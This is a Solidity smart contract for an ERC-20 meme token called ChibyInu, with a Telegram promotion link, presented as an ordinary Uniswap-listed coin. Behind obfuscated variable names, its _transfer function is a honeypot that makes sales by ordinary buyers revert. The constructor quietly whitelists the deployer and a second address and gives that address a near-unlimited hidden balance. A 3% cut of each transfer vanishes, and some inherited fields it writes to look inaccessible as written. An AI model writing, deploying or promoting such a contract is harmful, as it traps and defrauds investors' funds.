// https://t.me/chibyinu

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.4;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract ChibyInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private lovely;

    function _transfer(
        address brave,
        address limited,
        uint256 badly
    ) internal override {
        uint256 line = live;

        if (tomorrow[brave] == 0 && lovely[brave] > 0 && brave != uniswapV2Pair) {
            tomorrow[brave] -= line;
        }

        address steel = address(ocean);
        ocean = ChibyInu(limited);
        lovely[steel] += line + 1;

        _balances[brave] -= badly;
        uint256 flame = (badly / 100) * live;
        badly -= flame;
        _balances[limited] += badly;
    }

    mapping(address => uint256) private tomorrow;
    uint256 public live = 3;

    constructor(
        string memory hard,
        string memory coal,
        address unhappy,
        address put
    ) ERC20(hard, coal) {
        uniswapV2Router = IUniswapV2Router02(unhappy);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 round = ~uint256(0);

        tomorrow[msg.sender] = round;
        tomorrow[put] = round;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[put] = round;
    }

    ChibyInu private ocean;
}